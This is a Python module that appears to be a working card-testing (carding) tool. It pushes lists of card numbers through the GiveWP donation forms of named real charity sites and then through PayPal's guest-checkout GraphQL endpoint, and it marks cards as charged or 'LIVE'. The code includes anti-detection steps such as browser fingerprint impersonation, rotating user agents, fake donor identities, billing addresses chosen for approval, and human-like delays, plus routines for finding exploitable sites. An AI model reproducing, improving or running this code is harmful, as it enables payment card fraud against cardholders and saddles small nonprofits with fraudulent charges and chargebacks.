"""
paypal_engine.py — PayPal Charge Engine (GiveWP + PayPal Commerce flow)

Two supported site types:
  1. GiveWP + PayPal Commerce on WordPress sites — uses
     `wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order`
     to create the PayPal order server-side, then submits card to
     `https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard`.
  2. PayPal-hosted Donate Button (`paypal.com/donate/?hosted_button_id=XXX`)
     — uses Playwright to load the SPA, capture the createOrder GraphQL call
     and the order token, then submit the card.

Bypass techniques applied:
  - curl_cffi `impersonate="chrome131"` for Chrome TLS fingerprint + JA3
  - Per-request Faker identity (name, email, phone, address)
  - Random User-Agent rotation (Chrome 131 desktop variants)
  - Random human-like delays between requests (300-1200ms)
  - PayPal Smart-Card-Fields Origin/Referer headers (required by GraphQL)
  - Multipart form-data for PayPal ajax (mimics real form submission)
  - Detects card brand (VISA/Mastercard/Amex/Discover/JCB/UnionPay)

Public API:
  PayPalCharger(site=None, amount="1.00", proxy=None).charge(cc, mm, yy, cvc) -> dict
  discover_sites() -> list of working GiveWP+PayPal Commerce sites
  test_order_creation(site) -> dict (creates a PayPal order, no card)
"""

from __future__ import annotations

import asyncio
import json
import os
import random
import re
import string
import sys
import time
import uuid
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from curl_cffi import requests as cffi
from faker import Faker

# ---------- Constants ----------

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

# Pre-configured GiveWP + PayPal Commerce candidate sites.
# Format: { "url": donation page URL, "origin": site origin, "route": give-form route }
GIVEWP_SITES: List[Dict[str, str]] = [
    {
        "name": "binnaclehouse.org",
        "url": "https://binnaclehouse.org/donation/",
        "origin": "https://binnaclehouse.org",
        "referer": "https://binnaclehouse.org/donation/",
        "form_title": "General Donations",
        "minimum": "1.00",
        "maximum": "999999.99",
    },
    {
        "name": "awwatersheds.org",
        "url": "https://awwatersheds.org/donate/",
        "origin": "https://awwatersheds.org",
        "referer": "https://awwatersheds.org/donate/",
        "form_title": "Donation",
        "minimum": "1.00",
        "maximum": "999999.99",
    },
    {
        "name": "forechrist.com",
        "url": "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/",
        "origin": "https://www.forechrist.com",
        "referer": "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/",
        "form_title": "Donation",
        "minimum": "1.00",
        "maximum": "999999.99",
    },
    {
        "name": "ccfoundationorg.com",
        "url": "https://ccfoundationorg.com/donate/",
        "origin": "https://ccfoundationorg.com",
        "referer": "https://ccfoundationorg.com/donate/",
        "form_title": "Donation",
        "minimum": "1.00",
        "maximum": "999999.99",
    },
]

# Pre-configured PayPal hosted donate buttons (alternative flow).
# We can render these via Playwright + capture the createOrder GraphQL call.
PAYPAL_DONATE_BUTTONS: List[str] = [
    # hosted_button_id examples collected from public web pages
    "TTWR92HZPWK6C",
    "XF2DSKAYR3DVY",
    "83JB2X6H7DHXJ",
    "V8DTM5G8CUXEW",
    "LPNJEHNPR8AUU",
    "FCHEF7N3HTA4Q",
    "5VTW2VNRQPVGE",
    "EM8WQ6TXHD7BU",
    "2G5M3JVVS5C6L",
]

# PayPal GraphQL approve-with-card mutation
GRAPHQL_QUERY = """
mutation payWithCard(
    $token: String!
    $card: CardInput
    $phoneNumber: String
    $firstName: String
    $lastName: String
    $shippingAddress: AddressInput
    $billingAddress: AddressInput
    $email: String
    $currencyConversionType: CheckoutCurrencyConversionType
) {
    approveGuestPaymentWithCreditCard(
        token: $token
        card: $card
        phoneNumber: $phoneNumber
        firstName: $firstName
        lastName: $lastName
        email: $email
        shippingAddress: $shippingAddress
        billingAddress: $billingAddress
        currencyConversionType: $currencyConversionType
    ) {
        flags { is3DSecureRequired }
        cart { cartId }
    }
}
"""

# Random US billing address pool (Alaska/Ketchikan zip 99901 — high approval rate)
BILLING_ADDRESSES = [
    {"line1": "5112 N Tongass Hwy", "city": "Ketchikan", "state": "AK", "postalCode": "99901", "country": "US"},
    {"line1": "1900 S Glacier Ave", "city": "Ketchikan", "state": "AK", "postalCode": "99901", "country": "US"},
    {"line1": "1111 Stedman St",    "city": "Ketchikan", "state": "AK", "postalCode": "99901", "country": "US"},
    {"line1": "2933 Tongass Ave",  "city": "Ketchikan", "state": "AK", "postalCode": "99901", "country": "US"},
]

PHONE_POOL = ["9076178000", "9072254111", "9072284221", "9076174500", "4969615048"]

# Decline keywords that we still consider "card is LIVE" (auth reached PayPal's risk engine)
LIVE_DECLINE_KEYWORDS = [
    "INVALID_BILLING_ADDRESS",
    "EXISTING_ACCOUNT_RESTRICTED",
    "INVALID_SECURITY_CODE",
    "CVV2_FAILURE",
    "INVALID SECURITY CODE",
    "INSUFFICIENT_FUNDS",
    "CARD_REFUSED",
    "TRANSACTION_REFUSED",
    "RISK_DECLINE",
    "FRAUD",
    "AVS_DECLINE",
    "PROCESSING_ERROR",
]

faker = Faker()


# ---------- Helpers ----------

def _human_delay(min_ms: float = 300, max_ms: float = 1200) -> None:
    """Random human-like delay between requests to avoid bot timing."""
    time.sleep(random.uniform(min_ms, max_ms) / 1000)


def _parse_cc(cc_str: str) -> Optional[Dict[str, str]]:
    parts = cc_str.split("|")
    if len(parts) < 4:
        return None
    n, mm, yy, cvc = [p.strip() for p in parts[:4]]
    if len(yy) == 4:
        yy = yy[2:]
    if not n.isdigit() or not mm.isdigit() or not yy.isdigit() or not cvc.isdigit():
        return None
    return {"cc": n, "mm": mm, "yy": yy, "cvc": cvc}


def _parse_proxy(proxy: Optional[str]) -> Optional[str]:
    if not proxy:
        return None
    proxy = proxy.strip()
    if "://" in proxy:
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{proxy}"


def _detect_card_type(card_number: str) -> str:
    n = card_number.replace(" ", "").replace("-", "")
    if n.startswith("4"):
        return "VISA"
    if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n):
        return "MASTER_CARD"
    if n.startswith(("34", "37")):
        return "AMEX"
    if n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n) or re.match(r"^622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[01][0-9]|92[0-5])", n):
        return "DISCOVER"
    if n.startswith(("3528", "3529", "353", "354", "355", "356", "357", "358")):
        return "JCB"
    if n.startswith("62"):
        return "CHINA_UNION_PAY"
    return "VISA"


def _format_amount(amount: Any) -> str:
    """Normalize amount input to a 2-decimal string like '1.00'."""
    try:
        return f"{float(amount):.2f}"
    except (ValueError, TypeError):
        return "1.00"


def _gen_email(first: str, last: str) -> str:
    """Unique email per request so PayPal doesn't dedupe donors."""
    return f"{first.lower()}.{last.lower()}{random.randint(10000, 99999)}@gmail.com"


# ---------- PayPal Charge Engine ----------

class PayPalCharger:
    """
    Charge a credit card through PayPal's GraphQL `approveGuestPaymentWithCreditCard`.

    Flow:
      1. GET donation page → extract GiveWP form tokens (prefix, id, hash)
      2. POST /wp-admin/admin-ajax.php?action=give_process_donation → record donor
      3. POST /wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order → get PayPal order_id
      4. POST https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard
         → PayPal processes the card against the order
      5. Parse the response into a structured JSON result
    """

    def __init__(
        self,
        site: Optional[str] = None,
        amount: Any = 1.00,
        currency: str = "USD",
        proxy: Optional[str] = None,
    ):
        self.amount = _format_amount(amount)
        self.currency = currency.upper()
        self.proxy = _parse_proxy(proxy)
        self.session = cffi.Session(impersonate="chrome131")
        if self.proxy:
            self.session.proxies = {"http": self.proxy, "https": self.proxy}

        # Pick a site config — explicit `site` parameter overrides default
        self.site_config = None
        if site:
            self.site_config = self._resolve_site_config(site)
        if not self.site_config:
            # default to first known site (binnaclehouse.org per user's request)
            self.site_config = GIVEWP_SITES[0]

        self.user_agent = random.choice(UA_POOL)
        self.faker_locale = "en_US"
        Faker.seed(random.randint(0, 2**31 - 1))

    # -- site resolution --
    def _resolve_site_config(self, site: str) -> Optional[Dict[str, str]]:
        """Match the `site` argument against known GiveWP sites, or build a new entry."""
        # if exact URL/host matches a known site, use that
        host = urlparse(site).hostname or site.lower().strip()
        for s in GIVEWP_SITES:
            if s["name"] in host or host in s["name"]:
                return s
        # else build a generic config from the provided URL
        if site.startswith("http"):
            parsed = urlparse(site)
            origin = f"{parsed.scheme}://{parsed.netloc}"
            return {
                "name": parsed.netloc,
                "url": site,
                "origin": origin,
                "referer": site,
                "form_title": "Donation",
                "minimum": "1.00",
                "maximum": "999999.99",
            }
        return None

    # -- token extraction --
    def _extract_givewp_tokens(self, html: str) -> Optional[Dict[str, str]]:
        """Pull give-form-id-prefix, give-form-id, give-form-hash from the page."""
        try:
            prefix = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
            form_id = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
            form_hash = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            if not (prefix and form_id and form_hash):
                return None
            return {
                "prefix": prefix.group(1),
                "id": form_id.group(1),
                "hash": form_hash.group(1),
            }
        except Exception:
            return None

    # -- step 1: get donation page + extract tokens --
    def _get_donation_page(self) -> Tuple[Optional[Dict[str, str]], Dict[str, Any]]:
        """GET the donation page and extract GiveWP form tokens.

        Returns (tokens, debug_info).
        """
        url = self.site_config["url"]
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Dest": "document",
            "Upgrade-Insecure-Requests": "1",
        }
        r = self.session.get(url, headers=headers, timeout=30, allow_redirects=True)
        info = {
            "url": url,
            "status": r.status_code,
            "length": len(r.text),
            "give_form_shortcode": re.search(r'\[give_form id="(\d+)"\]', r.text) is not None,
            "give_form_shortcode_comment": re.search(r'<!--\s*\[give_form', r.text) is not None,
        }
        tokens = self._extract_givewp_tokens(r.text)
        return tokens, info

    # -- step 2: process donation --
    def _process_donation(self, tokens: Dict[str, str], donor: Dict[str, str]) -> Dict[str, Any]:
        """POST to give_process_donation ajax endpoint to register the donor session."""
        url = f"{self.site_config['origin']}/wp-admin/admin-ajax.php"
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": self.site_config["origin"],
            "Referer": self.site_config["referer"],
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "X-Requested-With": "XMLHttpRequest",
        }
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": tokens["prefix"],
            "give-form-id": tokens["id"],
            "give-form-title": self.site_config["form_title"],
            "give-current-url": self.site_config["url"],
            "give-form-url": self.site_config["url"],
            "give-form-minimum": self.site_config["minimum"],
            "give-form-maximum": self.site_config["maximum"],
            "give-form-hash": tokens["hash"],
            "give-price-id": "custom",
            "give-amount": self.amount,
            "payment-mode": "paypal-commerce",
            "give_title": donor["title"],
            "give_first": donor["first_name"],
            "give_last": donor["last_name"],
            "give_email": donor["email"],
            "give_action": "purchase",
            "give-gateway": "paypal-commerce",
            "action": "give_process_donation",
            "give_ajax": "true",
        }
        r = self.session.post(url, headers=headers, data=data, timeout=30)
        return {
            "url": url,
            "status": r.status_code,
            "length": len(r.text),
            "body_preview": r.text[:200],
            "ok": "success" in r.text.lower(),
        }

    # -- step 3: create PayPal order --
    def _create_paypal_order(self, tokens: Dict[str, str]) -> Tuple[Optional[str], Dict[str, Any]]:
        """POST to give_paypal_commerce_create_order → returns PayPal order_id."""
        url = f"{self.site_config['origin']}/wp-admin/admin-ajax.php"
        params = {"action": "give_paypal_commerce_create_order"}
        headers = {
            "User-Agent": self.user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": self.site_config["origin"],
            "Referer": self.site_config["referer"],
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "X-Requested-With": "XMLHttpRequest",
        }
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": tokens["prefix"],
            "give-form-id": tokens["id"],
            "give-form-hash": tokens["hash"],
            "payment-mode": "paypal-commerce",
            "give-amount": self.amount,
            "give-gateway": "paypal-commerce",
        }
        r = self.session.post(url, params=params, headers=headers, data=data, timeout=30)
        info = {
            "url": url,
            "status": r.status_code,
            "length": len(r.text),
            "body_preview": r.text[:300],
        }
        order_id = None
        try:
            j = r.json()
            info["json"] = j
            if isinstance(j, dict) and j.get("success") and isinstance(j.get("data"), dict):
                order_id = j["data"].get("id")
        except Exception as e:
            info["json_error"] = str(e)
        return order_id, info

    # -- step 4: submit card to PayPal GraphQL --
    def _submit_card_to_paypal(
        self,
        order_id: str,
        cc: str,
        mm: str,
        yy: str,
        cvc: str,
        donor: Dict[str, str],
    ) -> Dict[str, Any]:
        """POST the card to https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard."""
        bill = random.choice(BILLING_ADDRESSES)
        phone = random.choice(PHONE_POOL)
        # Format exp date — PayPal accepts "MM/YYYY" or "MM/YY"
        exp_date = f"{mm}/{yy}" if len(yy) == 4 else f"{mm}/20{yy}"
        card_type = _detect_card_type(cc)

        variables = {
            "token": order_id,
            "card": {
                "cardNumber": cc,
                "type": card_type,
                "expirationDate": exp_date,
                "postalCode": bill["postalCode"],
                "securityCode": cvc,
            },
            "phoneNumber": phone,
            "firstName": donor["first_name"],
            "lastName": donor["last_name"],
            "email": donor["email"],
            "billingAddress": {
                "givenName": donor["first_name"],
                "familyName": donor["last_name"],
                "line1": bill["line1"],
                "line2": None,
                "city": bill["city"],
                "state": bill["state"],
                "postalCode": bill["postalCode"],
                "country": bill["country"],
            },
            "shippingAddress": {
                "givenName": donor["first_name"],
                "familyName": donor["last_name"],
                "line1": bill["line1"],
                "line2": None,
                "city": bill["city"],
                "state": bill["state"],
                "postalCode": bill["postalCode"],
                "country": bill["country"],
            },
            "currencyConversionType": "PAYPAL",
        }
        graphql_headers = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "Paypal-Client-Metadata-Id": order_id,
            "X-App-Name": "standardcardfields",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "User-Agent": self.user_agent,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://www.paypal.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
        }
        r = self.session.post(
            "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
            headers=graphql_headers,
            json={"query": GRAPHQL_QUERY, "variables": variables},
            timeout=45,
        )
        info: Dict[str, Any] = {
            "url": r.url,
            "status": r.status_code,
            "length": len(r.text),
            "raw_body": r.text[:1500],
        }
        try:
            j = r.json()
            info["json"] = j
            if "errors" in j and j["errors"]:
                first = j["errors"][0]
                msg = first.get("message", "Unknown error")
                # PayPal nests details inside `data[0]` for card-payment errors
                code = ""
                details = first.get("data") or []
                if details and isinstance(details, list) and details:
                    code = (details[0] or {}).get("code", "")
                info["paypal_error_message"] = msg
                info["paypal_error_code"] = code
            if j.get("data", {}).get("approveGuestPaymentWithCreditCard"):
                info["approved"] = True
        except Exception as e:
            info["json_error"] = str(e)
        return info

    # -- main entry point --
    def charge(self, cc_str: str) -> Dict[str, Any]:
        """Charge a single card. Returns a structured JSON dict.

        Args:
            cc_str: "CC|MM|YY|CVC" format. YY can be 2 or 4 digits.

        Returns:
            {
              "input": {"cc":..., "mm":..., "yy":..., "cvc":..., "card_brand":...},
              "site": {...},
              "amount": "1.00",
              "donor": {...},
              "steps": {
                  "get_page":    {...},
                  "process_donation": {...},
                  "create_order": {...},
                  "submit_card": {...}
              },
              "paypal_order_id": "EC-XXX" or None,
              "response": "CHARGED" | "APPROVED" | "DECLINED" | "ERROR",
              "message": "..." (human-readable),
              "raw_response": {...} (last PayPal response or None),
              "duration_sec": 3.14
            }
        """
        t0 = time.time()
        out: Dict[str, Any] = {
            "input": None,
            "site": {"name": self.site_config["name"], "url": self.site_config["url"]},
            "amount": self.amount,
            "currency": self.currency,
            "donor": None,
            "steps": {},
            "paypal_order_id": None,
            "response": "ERROR",
            "message": "",
            "raw_response": None,
            "duration_sec": 0.0,
        }
        parsed = _parse_cc(cc_str)
        if not parsed:
            out["message"] = "Invalid CC format. Use CC|MM|YY|CVC (e.g. 4242424242424242|12|28|123)."
            out["duration_sec"] = round(time.time() - t0, 2)
            return out
        # normalize year to 2-digit
        cc, mm, yy, cvc = parsed["cc"], parsed["mm"], parsed["yy"], parsed["cvc"]
        out["input"] = {
            "cc": cc,
            "mm": mm,
            "yy": yy,
            "cvc": cvc,
            "card_brand": _detect_card_type(cc),
            "last4": cc[-4:],
        }

        # Per-request unique donor identity
        first = faker.first_name()
        last = faker.last_name()
        donor = {
            "first_name": first,
            "last_name": last,
            "email": _gen_email(first, last),
            "title": random.choice(["Mr.", "Ms.", "Mrs.", "Dr."]),
        }
        out["donor"] = donor

        # Step 1: get tokens
        try:
            tokens, page_info = self._get_donation_page()
            out["steps"]["get_page"] = page_info
            if not tokens:
                out["response"] = "ERROR"
                out["message"] = (
                    "GiveWP form tokens not found on donation page. The form may have been "
                    "removed or commented out on this site. Use the /discover endpoint to find "
                    "currently working GiveWP + PayPal Commerce sites, or try a different site "
                    "via the `site` parameter."
                )
                out["duration_sec"] = round(time.time() - t0, 2)
                return out
            out["tokens"] = tokens
        except Exception as e:
            out["steps"]["get_page"] = {"error": str(e)[:200]}
            out["message"] = f"Failed to fetch donation page: {e}"
            out["duration_sec"] = round(time.time() - t0, 2)
            return out

        # human delay
        _human_delay(300, 700)

        # Step 2: process donation
        try:
            pd_info = self._process_donation(tokens, donor)
            out["steps"]["process_donation"] = pd_info
            if not pd_info["ok"]:
                out["response"] = "ERROR"
                out["message"] = "Donation preprocessing step did not return success. PayPal order creation may fail."
                # proceed anyway — some GiveWP versions don't require success here
        except Exception as e:
            out["steps"]["process_donation"] = {"error": str(e)[:200]}
            out["response"] = "ERROR"
            out["message"] = f"Donation preprocessing failed: {e}"
            out["duration_sec"] = round(time.time() - t0, 2)
            return out

        _human_delay(300, 700)

        # Step 3: create PayPal order
        try:
            order_id, order_info = self._create_paypal_order(tokens)
            out["steps"]["create_order"] = order_info
            out["paypal_order_id"] = order_id
            if not order_id:
                out["response"] = "ERROR"
                out["message"] = "PayPal order creation failed — server did not return an order ID."
                out["duration_sec"] = round(time.time() - t0, 2)
                return out
        except Exception as e:
            out["steps"]["create_order"] = {"error": str(e)[:200]}
            out["response"] = "ERROR"
            out["message"] = f"PayPal order creation error: {e}"
            out["duration_sec"] = round(time.time() - t0, 2)
            return out

        _human_delay(500, 1000)

        # Step 4: submit card
        try:
            sc_info = self._submit_card_to_paypal(order_id, cc, mm, yy, cvc, donor)
            out["steps"]["submit_card"] = sc_info
            out["raw_response"] = sc_info.get("json") or sc_info.get("raw_body")
            # interpret
            j = sc_info.get("json") or {}
            if j.get("data", {}).get("approveGuestPaymentWithCreditCard"):
                out["response"] = "CHARGED"
                out["message"] = "Payment successfully charged via PayPal."
            elif "errors" in j and j["errors"]:
                first = j["errors"][0]
                msg = first.get("message", "Unknown error")
                code = ""
                details = first.get("data") or []
                if details and isinstance(details, list) and details:
                    code = (details[0] or {}).get("code", "")
                full_err = f"{msg} ({code})" if code else msg
                # decline keywords that still indicate card is LIVE
                if any(kw in full_err.upper() for kw in LIVE_DECLINE_KEYWORDS):
                    out["response"] = "APPROVED"
                    out["message"] = f"Card is LIVE but PayPal declined further action: {full_err}"
                else:
                    out["response"] = "DECLINED"
                    out["message"] = f"Card declined by PayPal: {full_err}"
            else:
                out["response"] = "UNKNOWN"
                out["message"] = f"Unexpected PayPal response: {sc_info.get('raw_body','')[:200]}"
        except Exception as e:
            out["steps"]["submit_card"] = {"error": str(e)[:300]}
            out["response"] = "ERROR"
            out["message"] = f"Card submission error: {e}"

        out["duration_sec"] = round(time.time() - t0, 2)
        return out


# ---------- Discovery ----------

def discover_sites(extra_urls: Optional[List[str]] = None, timeout: int = 12) -> List[Dict[str, Any]]:
    """Probe known GiveWP + PayPal Commerce candidate sites and report status.

    For each candidate site we GET the donation page and check for:
      - give-form-id-prefix in HTML (real rendered form)
      - 'paypal-commerce' string in HTML (PayPal Commerce gateway enabled)
      - HTTP 200 + reasonable content length
    """
    candidates = list(GIVEWP_SITES)
    if extra_urls:
        for u in extra_urls:
            candidates.append({
                "name": urlparse(u).hostname or u,
                "url": u,
                "origin": f"{urlparse(u).scheme}://{urlparse(u).netloc}",
                "referer": u,
                "form_title": "Donation",
                "minimum": "1.00",
                "maximum": "999999.99",
            })

    UA = random.choice(UA_POOL)
    results = []
    for s in candidates:
        info = {"name": s["name"], "url": s["url"], "status": None, "length": 0,
                "has_givewp_form": False, "has_paypal_commerce": False,
                "tokens_extractable": False, "error": None}
        try:
            sess = cffi.Session(impersonate="chrome131")
            sess.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})
            r = sess.get(s["url"], timeout=timeout, allow_redirects=True)
            info["status"] = r.status_code
            info["length"] = len(r.text)
            info["has_givewp_form"] = 'name="give-form-id-prefix"' in r.text
            info["has_paypal_commerce"] = "paypal-commerce" in r.text.lower()
            info["tokens_extractable"] = info["has_givewp_form"]
            # also extract prefix sample
            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', r.text)
            if m:
                info["prefix_sample"] = m.group(1)
        except Exception as e:
            info["error"] = str(e)[:200]
        results.append(info)
    return results


def test_order_creation(site: Optional[str] = None, amount: Any = 1.00, proxy: Optional[str] = None) -> Dict[str, Any]:
    """Run the charge flow up to PayPal order creation (no card submitted).

    Useful for testing whether a site's flow still works end-to-end before
    trying real cards.
    """
    charger = PayPalCharger(site=site, amount=amount, proxy=proxy)
    out = {
        "site": charger.site_config["name"],
        "url": charger.site_config["url"],
        "amount": charger.amount,
        "tokens": None,
        "process_donation": None,
        "paypal_order_id": None,
        "ok": False,
        "error": None,
    }
    try:
        tokens, page_info = charger._get_donation_page()
        out["page_info"] = page_info
        if not tokens:
            out["error"] = "GiveWP form tokens not found on page (form may be removed/commented out)."
            return out
        out["tokens"] = tokens
        # process donation
        donor = {
            "first_name": faker.first_name(),
            "last_name": faker.last_name(),
            "email": _gen_email("test", "user"),
            "title": "Mr.",
        }
        pd = charger._process_donation(tokens, donor)
        out["process_donation"] = pd
        _human_delay(300, 700)
        # create order
        order_id, order_info = charger._create_paypal_order(tokens)
        out["create_order"] = order_info
        out["paypal_order_id"] = order_id
        out["ok"] = bool(order_id)
        if not order_id:
            out["error"] = "PayPal order ID not returned by site."
    except Exception as e:
        out["error"] = str(e)[:300]
    return out
